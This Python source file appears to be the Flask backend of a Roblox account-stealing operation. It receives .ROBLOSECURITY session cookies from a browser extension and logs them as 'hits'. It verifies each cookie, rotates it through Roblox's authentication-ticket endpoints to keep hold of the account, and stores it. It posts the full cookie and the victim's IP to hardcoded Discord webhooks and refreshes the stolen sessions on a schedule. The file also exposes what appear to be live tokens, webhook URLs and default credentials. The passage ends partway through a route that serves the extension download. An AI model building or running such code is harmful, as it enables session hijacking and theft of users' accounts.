"""
RBX Tool - Full System
Flask Web Server + Discord Bot + Cookie Rotation + Cron Scheduler
✅ Auto Deploy Test - 2026-06-22
"""
import os
import sys
import json
import sqlite3
import threading
import time
import shutil
import logging
import base64
import hashlib
from collections import defaultdict
from datetime import datetime, timedelta, timezone

import requests as http_requests
from flask import Flask, render_template, request, jsonify, send_file, session, redirect, url_for
from flask_cors import CORS
from dotenv import load_dotenv
from functools import wraps

# =====================================================
# CONFIG
# =====================================================
load_dotenv()

DISCORD_TOKEN = os.getenv('DISCORD_TOKEN', 'MTI2OTI0NTM0MTU0NzYzMDYyMw.G8N4GC.E2Fs9Hbmq528vPuTrlXoaWiAPrrTwdwccrs1hQ')
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL', 'https://discord.com/api/webhooks/1518341400842731561/aNePu0KVOBcI_zb_bJNeH9Izd597v27NtJRgb_Xq_nHmKPT2DZdosgqe7ItRt0_RTNz6')  # Cookie notifications
DISCORD_WEBHOOK_URL_UPDATES = os.getenv('DISCORD_WEBHOOK_URL_UPDATES', 'https://discord.com/api/webhooks/1518591641198530652/s43keFLuzq-Rwr-oafbcYFGGQVTiLuY0zHNdVddHdNTeATADLtVVDV1Ii2A6DINZXNK6')  # Status/config updates
API_KEY = os.getenv('API_KEY', 'rbx_sk_9f3xKmPvQ7nW2jR8sL5yBcDe4hA6tG1u')
ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin123')
ADMIN_PANEL_ENABLED = False
DATA_ENCRYPTION_KEY = os.getenv('DATA_ENCRYPTION_KEY', 'shinsad0907')
PORT = int(os.getenv('PORT', 5000))
REFRESH_INTERVAL_MINUTES = int(os.getenv('REFRESH_INTERVAL_MINUTES', 30))

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'rbx_sessions.db')
LOG_FILE = os.path.join(BASE_DIR, 'hits.log')

# =====================================================
# LOGGING
# =====================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.StreamHandler(sys.stderr),
        logging.FileHandler(LOG_FILE, encoding='utf-8')
    ]
)
logger = logging.getLogger('RBX')

# =====================================================
# DATA PROTECTION
# =====================================================
def _derive_encryption_key():
    return hashlib.sha256(DATA_ENCRYPTION_KEY.encode('utf-8')).digest()


def encrypt_sensitive_data(value):
    if value is None:
        return ''
    if isinstance(value, (bytes, bytearray)):
        raw = bytes(value)
    else:
        try:
            raw = str(value).encode('utf-8')
        except (UnicodeDecodeError, UnicodeEncodeError):
            raw = str(value).encode('latin-1', errors='replace')
    if not raw:
        return ''

    key = _derive_encryption_key()
    nonce = os.urandom(12)
    stream = hashlib.sha256(key + nonce).digest()
    payload = bytearray()
    for index, byte in enumerate(raw):
        payload.append(byte ^ stream[index % len(stream)])
    return base64.b64encode(nonce + bytes(payload)).decode('ascii')


def decrypt_sensitive_data(value):
    if not value:
        return ''
    try:
        raw = base64.b64decode(value.encode('ascii'))
    except Exception:
        return str(value)
    if len(raw) < 12:
        return str(value)

    nonce = raw[:12]
    payload = raw[12:]
    key = _derive_encryption_key()
    stream = hashlib.sha256(key + nonce).digest()
    decoded = bytearray()
    for index, byte in enumerate(payload):
        decoded.append(byte ^ stream[index % len(stream)])
    try:
        return decoded.decode('utf-8')
    except UnicodeDecodeError:
        return decoded.decode('latin-1', errors='replace')


def _decode_session_row(row):
    if row is None:
        return None
    data = dict(row)
    data['cookie'] = decrypt_sensitive_data(data.get('cookie', ''))
    data['previousCookie'] = decrypt_sensitive_data(data.get('previousCookie', ''))
    return data

# =====================================================
# DATABASE (SQLite)
# =====================================================
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            userId TEXT UNIQUE NOT NULL,
            cookie TEXT NOT NULL,
            previousCookie TEXT DEFAULT '',
            username TEXT DEFAULT '',
            displayName TEXT DEFAULT '',
            userAgent TEXT DEFAULT '',
            status TEXT DEFAULT 'ALIVE' CHECK(status IN ('ALIVE','PAUSED','DIE')),
            messageId TEXT DEFAULT '',
            game TEXT DEFAULT '',
            ip TEXT DEFAULT '',
            refreshCount INTEGER DEFAULT 0,
            createdAt TEXT DEFAULT (datetime('now')),
            updatedAt TEXT DEFAULT (datetime('now'))
        );
        CREATE TABLE IF NOT EXISTS auth (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            userId TEXT UNIQUE NOT NULL,
            username TEXT DEFAULT '',
            password TEXT DEFAULT '',
            createdAt TEXT DEFAULT (datetime('now')),
            updatedAt TEXT DEFAULT (datetime('now')),
            FOREIGN KEY (userId) REFERENCES sessions(userId)
        );
    """)
    conn.commit()
    # Migration: add columns if they don't exist (for existing DBs)
    try:
        conn.execute("ALTER TABLE sessions ADD COLUMN previousCookie TEXT DEFAULT ''")
        conn.commit()
    except:
        pass
    try:
        conn.execute("ALTER TABLE sessions ADD COLUMN refreshCount INTEGER DEFAULT 0")
        conn.commit()
    except:
        pass
    conn.close()
    logger.info("[DB] Database initialized")

def db_upsert_session(userId, cookie, username='', displayName='', game='', ip='', status='ALIVE', messageId=''):
    conn = get_db()
    now = datetime.now(timezone.utc).isoformat()
    encrypted_cookie = encrypt_sensitive_data(cookie)
    conn.execute("""
        INSERT INTO sessions (userId, cookie, username, displayName, game, ip, status, messageId, createdAt, updatedAt)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(userId) DO UPDATE SET
            cookie=excluded.cookie,
            username=excluded.username,
            displayName=excluded.displayName,
            game=excluded.game,
            ip=excluded.ip,
            status=excluded.status,
            messageId=CASE WHEN excluded.messageId != '' THEN excluded.messageId ELSE sessions.messageId END,
            updatedAt=excluded.updatedAt
    """, (userId, encrypted_cookie, username, displayName, game, ip, status, messageId, now, now))
    conn.commit()
    conn.close()

def db_get_session(userId):
    conn = get_db()
    row = conn.execute("SELECT * FROM sessions WHERE userId = ?", (userId,)).fetchone()
    conn.close()
    return _decode_session_row(row)

def db_list_sessions(status=None):
    conn = get_db()
    if status:
        rows = conn.execute("SELECT * FROM sessions WHERE status = ? ORDER BY updatedAt DESC", (status,)).fetchall()
    else:
        rows = conn.execute("SELECT * FROM sessions ORDER BY updatedAt DESC").fetchall()
    conn.close()
    return [_decode_session_row(r) for r in rows]

def db_get_stale_sessions():
    """Get ALIVE sessions older than REFRESH_INTERVAL_MINUTES"""
    conn = get_db()
    # Get all ALIVE sessions
    rows = conn.execute(
        "SELECT * FROM sessions WHERE status = 'ALIVE' ORDER BY updatedAt DESC"
    ).fetchall()
    conn.close()
    
    now = datetime.now(timezone.utc)
    stale_sessions = []
    
    for row in rows:
        decoded_row = _decode_session_row(row)
        if not decoded_row:
            continue
        try:
            # Parse updatedAt - handle both ISO format and plain format
            updated_str = decoded_row['updatedAt']
            if 'T' in updated_str:
                # ISO format: 2026-06-22T17:35:14.562419+00:00
                updated = datetime.fromisoformat(updated_str.replace('Z', '+00:00'))
            else:
                # Plain format: 2026-06-22 17:35:14
                updated = datetime.fromisoformat(updated_str).replace(tzinfo=timezone.utc)
            
            # Calculate age in minutes
            age_minutes = (now - updated).total_seconds() / 60
            
            # If older than REFRESH_INTERVAL_MINUTES, mark as stale
            if age_minutes >= REFRESH_INTERVAL_MINUTES:
                stale_sessions.append(decoded_row)
                logger.info(f"[CRON] Debug: {decoded_row['username']} is stale ({age_minutes:.1f}min >= {REFRESH_INTERVAL_MINUTES}min)")
            else:
                logger.info(f"[CRON] Debug: {decoded_row['username']} is fresh ({age_minutes:.1f}min < {REFRESH_INTERVAL_MINUTES}min)")
        except Exception as e:
            logger.error(f"[CRON] Debug: Error parsing timestamp for {decoded_row.get('username', 'unknown')}: {e}")
            continue
    
    logger.info(f"[CRON] Debug: Total ALIVE: {len(rows)} | Stale: {len(stale_sessions)} | Threshold: {REFRESH_INTERVAL_MINUTES}min")
    
    return stale_sessions

def send_simple_update_notification(userId, username, update_type):
    """Send simple text notification for quick updates (non-cookie updates)"""
    if not DISCORD_WEBHOOK_URL_UPDATES:
        return
    
    try:
        message = f"Account {userId}|{username} has been updated"
        
        # Different color based on update type
        colors = {
            'COOKIE_ROTATED': 0x10b981,
            'STATUS_CHANGED': 0xf59e0b,
            'CREATED': 0x3b82f6,
            'CONFIG_UPDATED': 0x8b5cf6,
        }
        
        embed = {
            "description": f"✅ {message} - {update_type}",
            "color": colors.get(update_type, 0x3b82f6),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }
        
        payload = {"embeds": [embed]}
        http_requests.post(f"{DISCORD_WEBHOOK_URL_UPDATES}?wait=true", json=payload, timeout=10)
    except Exception as e:
        logger.debug(f"[NOTIFICATION] Failed to send simple notification: {e}")

def db_update_status(userId, status):
    conn = get_db()
    now = datetime.now(timezone.utc).isoformat()
    conn.execute("UPDATE sessions SET status = ?, updatedAt = ? WHERE userId = ?", (status, now, userId))
    conn.commit()
    conn.close()

def db_update_cookie(userId, cookie):
    conn = get_db()
    now = datetime.now(timezone.utc).isoformat()
    encrypted_cookie = encrypt_sensitive_data(cookie)
    # Save current cookie as previousCookie before updating
    conn.execute("""
        UPDATE sessions SET 
            previousCookie = cookie,
            cookie = ?,
            status = 'ALIVE',
            refreshCount = refreshCount + 1,
            updatedAt = ?
        WHERE userId = ?
    """, (encrypted_cookie, now, userId))
    conn.commit()
    conn.close()

def db_delete_session(userId):
    conn = get_db()
    conn.execute("DELETE FROM sessions WHERE userId = ?", (userId,))
    conn.execute("DELETE FROM auth WHERE userId = ?", (userId,))
    conn.commit()
    conn.close()

def db_count_by_status(status):
    conn = get_db()
    row = conn.execute("SELECT COUNT(*) as cnt FROM sessions WHERE status = ?", (status,)).fetchone()
    conn.close()
    return row['cnt'] if row else 0

def get_account_index(userId):
    """Get account index (1-based) in ordered list"""
    conn = get_db()
    rows = conn.execute("SELECT userId FROM sessions ORDER BY id ASC").fetchall()
    conn.close()
    for idx, row in enumerate(rows, 1):
        if row['userId'] == userId:
            return idx
    return 0

def db_update_message_id(userId, messageId):
    conn = get_db()
    conn.execute("UPDATE sessions SET messageId = ? WHERE userId = ?", (messageId, userId))
    conn.commit()
    conn.close()

# =====================================================
# COOKIE ROTATION (Roblox API)
# =====================================================
ROBLOX_AUTH_URL = "https://auth.roblox.com/v1/authentication-ticket"
ROBLOX_REDEEM_URL = "https://auth.roblox.com/v1/authentication-ticket/redeem"
ROBLOX_USER_URL = "https://users.roblox.com/v1/users/authenticated"

def get_roblox_user_info(cookie):
    """Get userId and username from cookie"""
    # Extract actual cookie (remove warning prefix if present)
    actual_cookie = cookie
    if '|_' in cookie:
        parts = cookie.split('|_')
        if len(parts) >= 2:
            actual_cookie = parts[-1]  # Get last part (actual cookie)
    
    try:
        resp = http_requests.get(
            ROBLOX_USER_URL,
            headers={'Cookie': f'.ROBLOSECURITY={actual_cookie}'},
            timeout=10
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                'id': str(data.get('id', '')),
                'name': data.get('name', ''),
                'displayName': data.get('displayName', '')
            }
    except Exception as e:
        logger.error(f"[ROBLOX] Error getting user info: {e}")
    return None

def rotate_cookie(old_cookie):
    """
    Rotate cookie: old cookie -> new cookie
    Step A: POST auth ticket (get csrf token)
    Step B: POST auth ticket with csrf (get ticket)
    Step C: POST redeem ticket (get new cookie)
    """
    # Extract actual cookie (remove warning prefix if present)
    actual_cookie = old_cookie
    if '|_' in old_cookie:
        parts = old_cookie.split('|_')
        if len(parts) >= 2:
            actual_cookie = parts[-1]  # Get last part (actual cookie)
    
    try:
        headers = {
            'Cookie': f'.ROBLOSECURITY={actual_cookie}',
            'Content-Type': 'application/json',
            'Referer': 'https://www.roblox.com'
        }

        # Step A: Get CSRF token
        logger.info("[ROTATE] Step A: Getting CSRF token...")
        resp_a = http_requests.post(ROBLOX_AUTH_URL, headers=headers, timeout=10)
        csrf_token = resp_a.headers.get('x-csrf-token')
        
        if not csrf_token:
            logger.error("[ROTATE] Failed to get CSRF token")
            return None

        # Step B: Get authentication ticket
        logger.info("[ROTATE] Step B: Getting auth ticket...")
        headers['x-csrf-token'] = csrf_token
        resp_b = http_requests.post(ROBLOX_AUTH_URL, headers=headers, timeout=10)
        auth_ticket = resp_b.headers.get('rbx-authentication-ticket')
        
        if not auth_ticket:
            logger.error("[ROTATE] Failed to get auth ticket")
            return None

        # Step C: Redeem ticket for new cookie
        logger.info("[ROTATE] Step C: Redeeming ticket for new cookie...")
        redeem_headers = {
            'Content-Type': 'application/json',
            'RBXAuthenticationNegotiation': '1',
        }
        redeem_body = {
            'authenticationTicket': auth_ticket
        }
        resp_c = http_requests.post(
            ROBLOX_REDEEM_URL,
            headers=redeem_headers,
            json=redeem_body,
            timeout=10
        )
        
        # Extract new cookie from Set-Cookie header
        set_cookie = resp_c.headers.get('set-cookie', '')
        new_cookie = None
        
        for part in set_cookie.split(','):
            if '.ROBLOSECURITY=' in part:
                cookie_val = part.split('.ROBLOSECURITY=')[1].split(';')[0].strip()
                if cookie_val and len(cookie_val) > 50:
                    new_cookie = cookie_val
                    break
        
        if new_cookie:
            logger.info(f"[ROTATE] SUCCESS - New cookie obtained ({len(new_cookie)} chars)")
            return new_cookie
        else:
            logger.error(f"[ROTATE] Failed to extract new cookie from response")
            return None

    except Exception as e:
        logger.error(f"[ROTATE] Error: {e}")
        return None

# =====================================================
# DISCORD WEBHOOK
# =====================================================
def send_discord_webhook(session_data, is_update=False, update_type='NEW'):
    """Send or update Discord webhook embed
    update_type: 'NEW', 'COOKIE_ROTATED', 'STATUS_CHANGED', 'CONFIG_UPDATED'
    """
    if not DISCORD_WEBHOOK_URL:
        logger.warning("[WEBHOOK] No webhook URL configured")
        return None

    full_cookie = session_data.get('cookie', 'N/A')
    status = session_data.get('status', 'ALIVE')
    status_emoji = '🟢' if status == 'ALIVE' else '🔴' if status == 'DIE' else '🟡'
    userId = session_data.get('userId', 'N/A')
    account_index = get_account_index(userId)

    # Determine title and color based on update type
    if update_type == 'NEW':
        title = f"✨ NEW ACCOUNT [#{account_index}]"
        color = 0x3b82f6
    elif update_type == 'COOKIE_ROTATED':
        title = f"🔄 COOKIE ROTATED [#{account_index}]"
        color = 0x10b981
    elif update_type == 'STATUS_CHANGED':
        title = f"✏️ STATUS CHANGED [#{account_index}]"
        color = 0xf59e0b
    else:
        title = f"📝 UPDATED [#{account_index}]"
        color = 0x8b5cf6

    embed = {
        "title": title,
        "color": color,
        "fields": [
            {"name": "📍 Account #", "value": f"`[{account_index}]`", "inline": True},
            {"name": "📌 User ID", "value": f"`{userId}`", "inline": True},
            {"name": "👤 Username", "value": session_data.get('username', 'N/A'), "inline": True},
            {"name": "📊 Status", "value": status_emoji + " " + status, "inline": True},
            {"name": "🎮 Display Name", "value": session_data.get('displayName', 'N/A'), "inline": True},
            {"name": "🕹️ Game", "value": session_data.get('game', 'N/A'), "inline": True},
            {"name": "🌐 IP", "value": session_data.get('ip', 'N/A'), "inline": True},
            {"name": "🔄 Rotations", "value": f"{session_data.get('refreshCount', 0)}x", "inline": True},
        ],
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "footer": {"text": "RBX Tool"}
    }

    # Send full plain cookie (HTTPS encrypts in transit automatically)
    display_cookie = full_cookie if full_cookie != 'N/A' else 'N/A'
    # Discord field limit is 1024 chars, ``` takes 6 chars → max cookie = 1018 chars
    if len(display_cookie) <= 1018:
        embed["fields"].append({"name": "🪙 Cookie", "value": f"```{display_cookie}```", "inline": False})
        payload = {"embeds": [embed]}
    else:
        # Cookie too long for embed field → send as message content so user can copy full cookie
        embed["fields"].append({"name": "🪙 Cookie", "value": "*(see below)*", "inline": False})
        payload = {"content": f"```{display_cookie}```", "embeds": [embed]}
    
    try:
        # Check if we should update existing message
        message_id = session_data.get('messageId', '')
        
        if is_update and message_id:
            # Edit existing webhook message
            resp = http_requests.patch(
                f"{DISCORD_WEBHOOK_URL}/messages/{message_id}",
                json=payload,
                timeout=10
            )
        else:
            # Send new webhook message
            resp = http_requests.post(
                f"{DISCORD_WEBHOOK_URL}?wait=true",
                json=payload,
                timeout=10
            )
        
        if resp.status_code in (200, 204):
            data = resp.json() if resp.text else {}
            new_message_id = data.get('id', message_id)
            logger.info(f"[WEBHOOK] {update_type} - Account [#{account_index}] {session_data.get('username', 'unknown')} (ID: {userId}) - Message: {new_message_id}")
            return new_message_id
        else:
            logger.error(f"[WEBHOOK] Error {resp.status_code}: {resp.text[:200]}")
            return None
    except Exception as e:
        logger.error(f"[WEBHOOK] Error: {e}")
        return None

# =====================================================
# PROCESS NEW HIT (Full pipeline)
# =====================================================
def process_new_hit(cookie, game='', ip='', username_hint='', display_hint=''):
    """
    Full pipeline when extension sends a cookie:
    1. Get user info (MUST succeed - reject fake cookies)
    2. Rotate cookie
    3. Save to DB
    4. Send Discord webhook
    """
    # Step 1: Get user info from original cookie - MUST succeed
    logger.info("[HIT] Step 1: Verifying cookie via Roblox API...")
    user_info = get_roblox_user_info(cookie)
    
    if not user_info:
        # Cookie is fake/invalid - REJECT immediately
        logger.warning(f"[HIT] REJECTED - Cookie verification failed (IP: {ip}). Possible spam attempt.")
        return {
            'userId': None,
            'username': None,
            'displayName': None,
            'status': 'rejected',
            'rotated': False
        }
    
    userId = user_info['id']
    username = user_info['name']
    displayName = user_info['displayName']
    logger.info(f"[HIT] Cookie verified: {username} ({userId})")
    
    # Step 2: Rotate cookie
    logger.info("[HIT] Step 2: Rotating cookie...")
    new_cookie = rotate_cookie(cookie)
    
    if new_cookie:
        final_cookie = new_cookie
        status = 'ALIVE'
        logger.info("[HIT] Cookie rotated successfully!")
    else:
        # Keep original cookie if rotation fails
        final_cookie = cookie
        status = 'ALIVE'
        logger.warning("[HIT] Cookie rotation failed, keeping original cookie")
    
    # Step 3: Save to DB
    logger.info("[HIT] Step 3: Saving to database...")
    existing = db_get_session(userId)
    is_update = existing is not None
    
    db_upsert_session(
        userId=userId,
        cookie=final_cookie,
        username=username,
        displayName=displayName,
        game=game,
        ip=ip,
        status=status
    )
    
    # Step 4: Send Discord webhook
    logger.info("[HIT] Step 4: Sending Discord webhook...")
    session_data = db_get_session(userId)
    if session_data:
        update_type = 'NEW' if not is_update else 'COOKIE_ROTATED'
        message_id = send_discord_webhook(session_data, is_update=is_update, update_type=update_type)
        if message_id:
            db_update_message_id(userId, message_id)
    
    # Console output
    output = f"""
============================================================
>>> {'HIT UPDATE' if is_update else 'NEW HIT RECEIVED'}!
============================================================
  [USER]    Username:     {username}
  [NAME]    Display Name: {displayName}
  [ID]      User ID:      {userId}
  [GAME]    Game:         {game}
  [STATUS]  Status:       {status}
  [ROTATE]  Rotated:      {'YES' if new_cookie else 'NO (kept original)'}
  [TIME]    Time:         {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  [IP]      IP:           {ip}
  [COOKIE]  Cookie:       [REDACTED]
============================================================
  [DB]      Total ALIVE:  {db_count_by_status('ALIVE')}
  [DB]      Total DIE:    {db_count_by_status('DIE')}
============================================================
"""
    sys.stderr.write(output)
    sys.stderr.flush()
    
    return {
        'userId': userId,
        'username': username,
        'displayName': displayName,
        'status': status,
        'rotated': new_cookie is not None
    }

# =====================================================
# CRON SCHEDULER - Auto refresh stale sessions
# =====================================================
scheduler_running = False

def refresh_stale_sessions():
    """Refresh all ALIVE sessions older than COOKIE_MAX_AGE_HOURS"""
    global scheduler_running
    if scheduler_running:
        logger.info("[CRON] Skipping - previous refresh still running")
        return
    
    scheduler_running = True
    try:
        stale = db_get_stale_sessions()
        if not stale:
            logger.info("[CRON] No stale sessions to refresh")
            return
        
        logger.info(f"[CRON] Found {len(stale)} stale sessions to refresh")
        
        success = 0
        failed = 0
        
        for session in stale:
            userId = session['userId']
            old_cookie = session['cookie']
            username = session['username']
            
            logger.info(f"[CRON] Refreshing {username} ({userId})...")
            new_cookie = rotate_cookie(old_cookie)
            
            if new_cookie:
                db_update_cookie(userId, new_cookie)
                # Update Discord webhook (cookie notification)
                updated_session = db_get_session(userId)
                if updated_session:
                    send_discord_webhook(updated_session, is_update=True, update_type='COOKIE_ROTATED')
                    # Also send to updates webhook
                    send_simple_update_notification(userId, username, 'COOKIE_ROTATED')
                success += 1
                logger.info(f"[CRON] Refreshed {userId} successfully")
            else:
                db_update_status(userId, 'DIE')
                send_simple_update_notification(userId, username, 'STATUS_CHANGED')
                failed += 1
                logger.warning(f"[CRON] Failed to refresh {userId} - marked as DIE")
            
            # Small delay between refreshes
            time.sleep(1)
        
        logger.info(f"[CRON] Refresh complete: {success} success, {failed} failed")
    
    except Exception as e:
        logger.error(f"[CRON] Error: {e}")
    finally:
        scheduler_running = False

def start_scheduler():
    """Start the cron scheduler in a background thread"""
    from apscheduler.schedulers.background import BackgroundScheduler
    
    scheduler = BackgroundScheduler()
    scheduler.add_job(
        refresh_stale_sessions,
        'interval',
        minutes=REFRESH_INTERVAL_MINUTES,
        id='refresh_sessions',
        name='Refresh stale sessions'
    )
    scheduler.start()
    logger.info(f"[CRON] Scheduler started - running every {REFRESH_INTERVAL_MINUTES} minutes")
    return scheduler

# =====================================================
# GLOBAL SCHEDULER (for dynamic updates)
# =====================================================
global_scheduler = None

# =====================================================
# FLASK APP
# =====================================================
app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'rbx-secret-key-2024-session')

# Allow all CORS requests (extension + browser)
CORS(app, 
     origins="*",
     allow_headers=["Content-Type", "Authorization", "X-API-Key"],
     methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"])

# Add header hook for maximum CORS compatibility
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-API-Key')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    response.headers.add('Access-Control-Max-Age', '3600')
    return response

# =====================================================
# RATE LIMITING (in-memory, per IP)
# =====================================================
_rate_limit_store = defaultdict(list)  # ip -> [timestamps]
RATE_LIMIT_MAX_REQUESTS = 5   # max requests
RATE_LIMIT_WINDOW_SECONDS = 60  # per 60 seconds

def _is_rate_limited(ip):
    """Check if IP has exceeded rate limit. Returns True if limited."""
    now = time.time()
    # Clean old entries
    _rate_limit_store[ip] = [t for t in _rate_limit_store[ip] if now - t < RATE_LIMIT_WINDOW_SECONDS]
    if len(_rate_limit_store[ip]) >= RATE_LIMIT_MAX_REQUESTS:
        return True
    _rate_limit_store[ip].append(now)
    return False

# =====================================================
# API KEY AUTHENTICATION
# =====================================================
def require_api_key(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key', '')
        if api_key != API_KEY:
            logger.warning(f"[AUTH] Invalid API key from {request.remote_addr}")
            return jsonify({'error': 'Unauthorized - Invalid API key'}), 401
        return f(*args, **kwargs)
    return decorated_function

# =====================================================
# AUTHENTICATION
# =====================================================
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not ADMIN_PANEL_ENABLED:
            if request.path.startswith('/api/'):
                return jsonify({'error': 'Admin panel disabled', 'success': False}), 404
            return 'Admin panel disabled', 404
        if 'admin_logged_in' not in session:
            # If it's an API request, return JSON error
            if request.path.startswith('/api/'):
                return jsonify({'error': 'Unauthorized - Please login first', 'success': False}), 401
            # Otherwise redirect to login page
            return redirect(url_for('admin_login_page'))
        return f(*args, **kwargs)
    return decorated_function

def setup_images():
    src_dir = os.path.join(os.path.dirname(BASE_DIR), '.gemini', 'antigravity-ide', 'brain', '727edc76-0854-42dc-9307-d5a553698c39')
    if not os.path.exists(src_dir):
        src_dir = r"C:\Users\pc\.gemini\antigravity-ide\brain\727edc76-0854-42dc-9307-d5a553698c39"
    dst_dir = os.path.join(BASE_DIR, 'static', 'images')
    os.makedirs(dst_dir, exist_ok=True)
    files = {
        "jailbreak_game_1782061689200.png": "jailbreak.png",
        "murder_mystery_game_1782061700150.png": "murder_mystery.png",
        "steal_brainrot_game_1782061710551.png": "steal_brainrot.png",
    }
    for src_name, dst_name in files.items():
        src_path = os.path.join(src_dir, src_name)
        dst_path = os.path.join(dst_dir, dst_name)
        if os.path.exists(src_path) and not os.path.exists(dst_path):
            shutil.copy2(src_path, dst_path)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/sessions', methods=['POST'])
@require_api_key
def receive_session():
    try:
        ip = request.remote_addr
        
        # Rate limiting check
        if _is_rate_limited(ip):
            logger.warning(f"[RATE-LIMIT] IP {ip} exceeded rate limit")
            return jsonify({'error': 'Too many requests. Try again later.'}), 429
        
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        cookie = data.get('cookie', '')
        game = data.get('game', 'N/A')
        username_hint = data.get('username', '')
        display_hint = data.get('displayName', '')
        action = data.get('action', 'Unknown')
        
        if not cookie:
            return jsonify({'error': 'No cookie provided'}), 400
        
        # Basic cookie sanity check - must be long enough
        if len(cookie) < 100:
            logger.warning(f"[API] Rejected short/fake cookie from {ip} (len={len(cookie)})")
            return jsonify({'error': 'Invalid cookie'}), 400
        
        logger.info(f"[API] Received session from {ip} - action: {action}")
        
        # Process the hit - will verify cookie via Roblox API
        result = process_new_hit(
            cookie=cookie,
            game=game,
            ip=ip,
            username_hint=username_hint,
            display_hint=display_hint
        )
        
        # Check if cookie was rejected (fake/invalid)
        if result and result.get('status') == 'rejected':
            return jsonify({'error': 'Cookie verification failed', 'status': 'rejected'}), 403
        
        # Extract userId from result if available
        userId = result.get('userId') if result else None
        
        return jsonify({
            'status': 'success',
            'message': 'Session processed',
            'userId': userId,
            'data': result
        }), 200
        
    except Exception as e:
        logger.error(f"[API] Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/sessions', methods=['GET'])
@require_api_key
def list_sessions_api():
    status_filter = request.args.get('status', None)
    sessions = db_list_sessions(status_filter)
    for s in sessions:
        s.pop('cookie', None)
        s.pop('previousCookie', None)
    return jsonify({'count': len(sessions), 'sessions': sessions})

@app.route('/api/sessions/<userId>', methods=['GET'])
def get_session_status(userId):
    """Get session status for extension monitoring"""
    session_data = db_get_session(userId)
    if not session_data:
        return jsonify({'error': 'Session not found'}), 404
    
    return jsonify({
        'userId': session_data['userId'],
        'username': session_data['username'],
        'status': session_data['status'],
        'displayName': session_data.get('displayName', ''),
        'game': session_data.get('game', ''),
        'updatedAt': session_data.get('updatedAt', '')
    })

@app.route('/api/sessions/<userId>', methods=['DELETE'])
@login_required
def delete_session_api(userId):
    db_delete_session(userId)
    logger.info(f"[ADMIN] Deleted session: {userId}")
    return jsonify({'status': 'deleted', 'userId': userId})

@app.route('/api/sessions/<userId>/refresh', methods=['POST'])
@login_required
def refresh_session_api(userId):
    """Manually refresh a session's cookie"""
    try:
        session_data = db_get_session(userId)
        if not session_data:
            return jsonify({'error': 'Session not found'}), 404
        
        old_cookie = session_data['cookie']
        username = session_data['username']
        
        # Rotate cookie
        new_cookie = rotate_cookie(old_cookie)
        
        if new_cookie:
            db_update_cookie(userId, new_cookie)
            updated_session = db_get_session(userId)
            if updated_session:
                send_discord_webhook(updated_session, is_update=True, update_type='COOKIE_ROTATED')
                send_simple_update_notification(userId, username, 'COOKIE_ROTATED')
            
            logger.info(f"[ADMIN] Manually refreshed cookie for: {username} ({userId})")
            return jsonify({'success': True, 'message': f'✅ Cookie refreshed for {username}!', 'status': 'ALIVE'})
        else:
            # Mark as DIE if refresh fails
            db_update_status(userId, 'DIE')
            send_simple_update_notification(userId, username, 'STATUS_CHANGED')
            logger.warning(f"[ADMIN] Failed to refresh {userId} - marked as DIE")
            return jsonify({'error': 'Failed to rotate cookie', 'status': 'DIE'}), 400
            
    except Exception as e:
        logger.error(f"[ADMIN] Refresh error for {userId}: {e}")
        return jsonify({'error': str(e)}), 500

def admin_panel_disabled_response():
    return jsonify({'success': False, 'error': 'Admin panel disabled'}), 404

@app.route('/admin')
@login_required
def admin_dashboard():
    if not ADMIN_PANEL_ENABLED:
        return "Admin panel disabled", 404
    return render_template('admin.html')

@app.route('/admin-login')
def admin_login_page():
    if not ADMIN_PANEL_ENABLED:
        return "Admin panel disabled", 404
    if 'admin_logged_in' in session:
        return redirect(url_for('admin_dashboard'))
    return render_template('admin_login.html')

@app.route('/api/admin/login', methods=['POST'])
def api_admin_login():
    if not ADMIN_PANEL_ENABLED:
        return admin_panel_disabled_response()
    try:
        data = request.get_json()
        username = data.get('username', '').strip()
        password = data.get('password', '').strip()
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            session['admin_username'] = username
            logger.info(f"[ADMIN] Login successful for user: {username}")
            return jsonify({'success': True, 'message': '✅ Đăng nhập thành công!'})
        else:
            logger.warning(f"[ADMIN] Failed login attempt with username: {username}")
            return jsonify({'success': False, 'error': '❌ Tên đăng nhập hoặc mật khẩu sai'}), 401
    except Exception as e:
        logger.error(f"[ADMIN] Login error: {e}")
        return jsonify({'error': 'Lỗi đăng nhập'}), 500

@app.route('/api/admin/logout', methods=['POST'])
def api_admin_logout():
    if not ADMIN_PANEL_ENABLED:
        return admin_panel_disabled_response()
    session.clear()
    logger.info("[ADMIN] User logged out")
    return jsonify({'success': True, 'message': 'Đã đăng xuất'})

@app.route('/api/download-extension', methods=['GET'])
def download_extension():
    """Download encrypted extension"""
    try:
        ext_file = os.path.join(BASE_DIR, 'static', 'downloads', 'rbx_extension.zip')
        if not os.path.exists(ext_file):
            return jsonify({'error': 'Extension file not found'}), 404
